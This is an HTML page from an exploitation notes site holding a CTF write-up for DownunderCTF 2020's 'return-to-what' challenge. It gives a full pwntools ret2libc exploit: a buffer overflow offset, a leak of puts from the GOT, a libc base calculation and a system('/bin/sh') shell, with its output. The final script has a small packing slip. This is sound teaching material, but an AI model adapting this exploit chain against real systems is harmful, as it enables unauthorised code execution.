<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>return-to-what - Exploitation Freaks</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwntools-debugging.html"><strong aria-hidden="true">2.1.</strong> Pwntools Debugging</a></li><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.2.</strong> CVE-2015-3887</a></li><li class="chapter-item expanded "><a href="pwnkit.html"><strong aria-hidden="true">2.3.</strong> Deep Into Pwnkit - CVE-2021-4034</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.4.</strong> TetCTF 2022</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="newbie_tetctf.html"><strong aria-hidden="true">2.4.1.</strong> Newbie</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.5.</strong> Cyber Santa is Coming to Town</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="hackthebox-pwn-snowy.html"><strong aria-hidden="true">2.5.1.</strong> Mr Snowy</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-sleigh.html"><strong aria-hidden="true">2.5.2.</strong> Sleigh</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-naughty-list.html"><strong aria-hidden="true">2.5.3.</strong> Naughty List</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-minimelfistic.html"><strong aria-hidden="true">2.5.4.</strong> Minimelfistic</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.6.</strong> ROPEmporium</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="ropemporium-split.html"><strong aria-hidden="true">2.6.1.</strong> Split</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.7.</strong> NahamCon 2021</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="nahamcon_ret2basic.html"><strong aria-hidden="true">2.7.1.</strong> ret2basic</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.8.</strong> DownunderCTF 2020</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="return-to-what.html" class="active"><strong aria-hidden="true">2.8.1.</strong> return-to-what</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><a href="gomalware-reversing-in-action.html"><strong aria-hidden="true">3.2.</strong> Go Malware Reverse Engineering with Kaspersky</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-embryoasm_level6.html"><strong aria-hidden="true">3.3.1.</strong> EmbryoASM Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell_level1.html"><strong aria-hidden="true">3.3.2.</strong> BabyShell Level 1</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level3.html"><strong aria-hidden="true">3.3.3.</strong> BabyShell Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level4.html"><strong aria-hidden="true">3.3.4.</strong> BabyShell Level 4</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level5.html"><strong aria-hidden="true">3.3.5.</strong> BabyShell Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level6.html"><strong aria-hidden="true">3.3.6.</strong> BabyShell Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level7.html"><strong aria-hidden="true">3.3.7.</strong> BabyShell Level 7</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level8.html"><strong aria-hidden="true">3.3.8.</strong> Babyshell Level 8</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-5.html"><strong aria-hidden="true">3.3.9.</strong> BabyReverse Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-10.html"><strong aria-hidden="true">3.3.10.</strong> BabyReverse Level 10</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-13.html"><strong aria-hidden="true">3.3.11.</strong> BabyReverse Level 13</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-15.html"><strong aria-hidden="true">3.3.12.</strong> BabyReverse Level 15</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-2.html"><strong aria-hidden="true">3.3.13.</strong> EmbryoGDB Level 2</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-3.html"><strong aria-hidden="true">3.3.14.</strong> EmbryoGDB Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-4.html"><strong aria-hidden="true">3.3.15.</strong> EmbryoGDB Level 4</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">3.4.1.</strong> credchecker</a></li><li class="chapter-item expanded "><a href="flare-on_known.html"><strong aria-hidden="true">3.4.2.</strong> known</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.5.</strong> Flare 7 (2020)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="flare-on_garbage.html"><strong aria-hidden="true">3.5.1.</strong> garbage</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Programming</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">4.1.</strong> The Linux Programming Interface</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="programming-tee.html"><strong aria-hidden="true">4.1.1.</strong> Exercise 4.1 (reproducing the tee linux binary)</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Practical Binary Analysis Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.1.</strong> Chapter 1</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-1.html"><strong aria-hidden="true">5.1.1.</strong> The C Compilation Process</a></li><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-2.html"><strong aria-hidden="true">5.1.2.</strong> Symbols and Stripped Binaries</a></li><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-3.html"><strong aria-hidden="true">5.1.3.</strong> Disassembling a Binary</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Networking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="mass-wificracking.html"><strong aria-hidden="true">6.1.</strong> Mass Wifi Cracking at Scale</a></li><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">6.2.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">6.3.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">6.4.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">6.5.</strong> RTL88x2bu Fake Access Point</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">7.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">7.1.</strong> Windows Cheatsheet</a></li><li class="chapter-item expanded "><a href="wireshark_weaponization.html"><strong aria-hidden="true">7.2.</strong> Wireshark Weaponization</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.</strong> HackTheBox</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="htb-paper.html"><strong aria-hidden="true">8.1.</strong> Paper</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">9.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="irc.html"><strong aria-hidden="true">9.1.</strong> Join a IRC Server anonymously</a></li><li class="chapter-item expanded "><a href="docker.html"><strong aria-hidden="true">9.2.</strong> Docker Tricks</a></li><li class="chapter-item expanded "><a href="scan_faster.html"><strong aria-hidden="true">9.3.</strong> Quicker Port Scans with Masscan</a></li><li class="chapter-item expanded "><a href="bashfuscator.html"><strong aria-hidden="true">9.4.</strong> Bashfuscator</a></li><li class="chapter-item expanded "><a href="python_socketio.html"><strong aria-hidden="true">9.5.</strong> Python - Working with socket.io</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Exploitation Freaks</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="return-to-what"><a class="header" href="#return-to-what">return-to-what</a></h1>
<p>this challenge was quite cool to complete, although i completed it locally on my machine (Arch Linux 5.16.4-arch1-1) instead of the real target (a Ubuntu machine) although i will show at the end how to do this challenge on ubuntu using <code>libc-database</code>.</p>
<h2 id="checking-the-binary"><a class="header" href="#checking-the-binary">Checking the binary</a></h2>
<p>First things first, we want to check which linker/libraries are attached to this binary, to do so i will use the <code>ldd</code> command on our binary :</p>
<pre><code>$ ldd ./challenge/return-to-what
		linux-vdso.so.1 (0x00007fff53558000)
		libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007fe8db8f4000)
		/lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fe8dbb04000)
</code></pre>
<p>In the preceding output, you can see that the binary uses <code>/usr/lib/libc.so.6</code>. Next let's check for the protections on this binary.</p>
<pre><code>$ checksec --file challenge/return-to-what
[*] '/home/korenkovichski/Documents/CTF/DownunderCTF_2020/pwn/return-to-what/challenge/return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>Luckily for us the binary has no PIE which will make our life a LOT easier for determining libc offsets, since offsets will stay the same every time we run the binary.</p>
<h2 id="finding-a-vulnerability"><a class="header" href="#finding-a-vulnerability">Finding a vulnerability</a></h2>
<p>Now it's time to find where this program is vulnerable, in this case i didn't need a disassembler to find the vulnerable part, i just tried a cyclic pattern and the program directly crashed.</p>
<pre><code>$ ./return-to-what &lt;&lt;&lt;$(cyclic 200)
Today, we'll have a lesson in returns.
Where would you like to return to?
[1]    23700 segmentation fault (core dumped)  ./return-to-what &lt;&lt;&lt; $(cyclic 200)
</code></pre>
<p>So i hopped in GDB and found the offset at which we overwrite the return address.</p>
<pre><code>pwndbg&gt; r &lt;&lt;&lt;$(cyclic 200)
pwndbg&gt; cyclic -l 0x6161616f
56
</code></pre>
<p>We know we need a padding of 56 bytes before we can start overwriting the return address and therefore gaining control of the program.</p>
<h2 id="leak-a-function-from-got-table"><a class="header" href="#leak-a-function-from-got-table">Leak a function from .got table</a></h2>
<p>Now we need a leak, since the challenge doesn't provide any libc files, our binary is using the default libc library at <code>/usr/lib/libc.so.6</code>, since it's the default library on my OS it is quite complete and contains the <code>puts</code> function which is the easiest one to use when trying to leak addresses, we will leak the <code>puts</code> function in the <code>.got table</code> and call <code>puts</code> through the <code>procedure linkage table</code>.</p>
<pre><code class="language-py">from pwn import *

e = ELF(&quot;./challenge/return-to-what&quot;, checksec=False)
libc = ELF(&quot;/usr/lib/libc.so.6&quot;, checksec=False)

io = process(e.path)

context.binary = e
context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]

PADDING_BEFORE_RETADDR = 56

rop = ROP(e)
POP_RDI_RET = rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0]


PAYLOAD = [
	PADDING_BEFORE_RETADDR * b&quot;A&quot;,
	p64(POP_RDI_RET),
	p64(e.got.puts),
	p64(e.plt.puts)
]

io.sendline(b&quot;&quot;.join(PAYLOAD))

io.recvline()
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b&quot;\x00&quot;))
info(f&quot;puts leak : {hex(leak)}&quot;)
io.interactive()
</code></pre>
<p>Running the script, proof that indeed we were able to leak the address of <code>puts</code> in the <code>global offset table</code>.</p>
<pre><code class="language-bash">$ python3 leak.py
[+] Starting local process '/home/korenkovichski/Documents/CTF/DownunderCTF_2020/pwn/return-to-what/challenge/return-to-what': pid 24257
[*] Loaded 14 cached gadgets for './challenge/return-to-what'
[*] puts leak : 0x7f9664a92ab0
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
</code></pre>
<h2 id="calculate-libc-address-using-leak"><a class="header" href="#calculate-libc-address-using-leak">Calculate libc address using leak</a></h2>
<p>Our goal in this challenge is to end up calling <code>system(&quot;/bin/sh&quot;)</code> which will spawn us a shell, but manually calling system through an exploit is impossible if you don't know the actual address of system in memory.</p>
<p>We're a bit lucky here, PIE was disabled and therefore address will stay the same most of the time.</p>
<p>So time to calculate that offset, to do that we just need a simple substraction <code>&quot;(current address of puts - it's offset in libc)&quot;</code>, this simple operation should result in the base address of libc. We can add the following code to our script.</p>
<pre><code class="language-py">info(f&quot;offset of puts in libc : {hex(libc.symbols[&quot;puts&quot;])}&quot;)
libc.address = leak - libc.symbols[&quot;puts&quot;]
info(f&quot;base address of libc : {hex(libc.address)}&quot;)
</code></pre>
<p>Now if we run the script again we can see the base address of libc was leaked properly !</p>
<pre><code class="language-sh">python3 leak.py
[+] Starting local process '/home/korenkovichski/Documents/CTF/DownunderCTF_2020/pwn/return-to-what/challenge/return-to-what': pid 24399
[*] Loaded 14 cached gadgets for './challenge/return-to-what'
[*] puts leak : 0x7f123607aab0
[*] offset of puts in libc : 0x76ab0
[*] base address of libc : 0x7f1236004000
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
</code></pre>
<p>The outputs makes a lot of sense, libc address tend to end with a bunch of zeros.</p>
<h2 id="catch-shell"><a class="header" href="#catch-shell">Catch Shell</a></h2>
<p>Funniest part, time to catch shells... hehe. Now to make the exploit simpler, we will call the main function once again and therefore we will hit the vulnerable part of our program a second time where we will input another buffer overflow payload, but this time since we know the base address of libc we can just call <code>system(&quot;/bin/sh&quot;)</code>.</p>
<p>Here is the final exploit that i used to exploit and win this challenge.</p>
<pre><code class="language-py">from pwn import *

e = ELF(&quot;./challenge/return-to-what&quot;, checksec=False)
libc = ELF(&quot;/usr/lib/libc.so.6&quot;, checksec=False)

io = process(e.path)

context.binary = e
context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]

PADDING_BEFORE_RETADDR = 56

rop = ROP(e)
POP_RDI_RET = rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0]


PAYLOAD = [
	PADDING_BEFORE_RETADDR * b&quot;A&quot;,
	p64(POP_RDI_RET),
	p64(e.got.puts),
	p64(e.plt.puts),
	p64(e.sym.main)  # note this change
]

io.sendline(b&quot;&quot;.join(PAYLOAD))

io.recvline()
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b&quot;\x00&quot;))
info(f&quot;puts leak : {hex(leak)}&quot;)

info(f&quot;offset of puts in libc : {hex(libc.symbols[&quot;puts&quot;])}&quot;)
libc.address = leak - libc.symbols[&quot;puts&quot;]
info(f&quot;base address of libc : {hex(libc.address)}&quot;)

SECOND_PAYLOAD = [
	b&quot;A&quot;*56,
	POP_RDI_RET,
	p64(next(libc.search(b&quot;/bin/sh&quot;))),
	p64(libc.sym[&quot;system&quot;])
]

io.sendline(b&quot;&quot;.join(SECOND_PAYLOAD))

io.interactive()
</code></pre>
<p>Running the preceding code locally with the right libc path should usually result in you obtaining a shell, however when the challenge is being ran on a remote ubuntu machine, we do not have access to the library.</p>
<h2 id="finding-the-right-library"><a class="header" href="#finding-the-right-library">Finding the right library</a></h2>
<p>Our binary is running on a remote system, ready to be pwned hehe. But we have a problem, we don't know what are the offsets in libc. What you can do is instead of leaking puts, you can leak other functions too in the .got table, then head up at https://libc.rip and search those offsets together, this shoud output you the correct libc version that you need to pwn.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="nahamcon_ret2basic.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="anatomy-of-a-gopher.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="nahamcon_ret2basic.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="anatomy-of-a-gopher.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
